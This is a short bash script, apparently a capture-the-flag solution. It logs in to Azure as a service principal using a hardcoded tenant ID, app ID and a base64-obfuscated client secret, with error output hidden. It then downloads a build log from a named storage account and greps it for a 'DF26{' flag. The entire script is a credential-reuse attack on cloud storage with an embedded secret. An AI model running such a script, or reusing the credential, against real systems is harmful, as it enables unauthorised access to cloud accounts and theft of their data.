#!/usr/bin/env bash
set -uo pipefail
TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"; APP=462d1c38-4459-48b8-9333-82e389e59514
SECRET=$(echo 'c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==' | base64 -d)
az login --service-principal -u "$APP" -p "$SECRET" --tenant "$TENANT" -o none 2>/dev/null
az storage blob download --account-name sttblcilogsprodx3euoz --container-name logs --name build-2024.log --auth-mode key --file /tmp/b.log -o none 2>/dev/null
echo "SIZE=$(wc -c < /tmp/b.log)"
echo "=== HEAD ==="
head -c 3000 /tmp/b.log
echo
echo "=== GREP FLAG ==="
grep -aE "DF26\{|flag|FLAG" /tmp/b.log | head -20
